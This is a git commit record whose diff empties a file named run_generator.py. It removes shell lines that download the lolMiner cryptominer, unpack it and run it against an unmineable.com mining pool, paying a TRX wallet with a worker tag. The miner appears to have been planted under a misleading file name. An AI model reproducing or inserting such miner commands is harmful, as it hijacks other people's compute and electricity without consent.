ce49844b8ec0713fc99088c794082b4071d2901d
FRIX_Y <73866768+splash24686@users.noreply.github.com>
2021-10-26 19:06:40 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,7 +1,1 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
 
-tar -xf lolMiner_v1.29_Lin64.tar.gz
-
-cd 1.29
-
-./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUbXKYJBTYgRDXppuWxHMF7dTaPwXWZHPf.Splash_LK#ek61-6h9x --ethstratum ETHPROXY
